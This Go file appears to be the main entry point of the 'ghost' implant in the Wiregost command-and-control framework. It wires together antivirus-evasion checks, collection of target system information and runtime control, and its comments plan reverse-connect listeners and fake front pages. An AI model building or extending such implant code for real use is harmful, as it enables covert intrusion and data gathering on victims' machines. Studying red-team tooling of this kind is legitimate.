package main

import (
	"github.com/maxlandon/wiregost/ghost/assets"
	"github.com/maxlandon/wiregost/ghost/core/generic/channels"
	"github.com/maxlandon/wiregost/ghost/core/generic/evasion"
	"github.com/maxlandon/wiregost/ghost/core/generic/info"
	"github.com/maxlandon/wiregost/ghost/log"
	"github.com/maxlandon/wiregost/ghost/profile"
)

func main() {

	// Gather and check all compile-time variables/configuration
	assets.SetupImplantAssets()

	// Init logging
	log.SetupLogging()

	// Implant concurrency management.
	channels.SetupChannels()

	// Security ----------------------------------------------------------------------------------

	// Various Security checks (antivirus software running, etc)
	evasion.SetupSecurity()

	// Check/set limits

	// Information -------------------------------------------------------------------------------

	// Ghost info, networks available, users connected, env variables
	// Permissions, Owner, OS details, OS specific information.
	info.LoadTargetInformation()

	// Communications & Routing -----------------------------------------------------------------

	// Set network security & credentials
	// Authorisations to connect to listener, fake front pages/redirections
	// credentials, certificates, etc...

	// Reverse connect or bind listener (goroutine, + send information)

	// Register RPC services if listener

	// Open routes given by server. Check all security details (fake pages,
	// credentials and authorisations.)

	// OS-Specific -----------------------------------------------------------------------------

	// Windows: Load and setup all Windows-related objects/functions

	// Other -----------------------------------------------------------------------------------

	// Monitor performance and resource usage, profiling.
	// (Sends reports to server every once in while.) (blocking)
	profile.StartRuntimeControl()
}
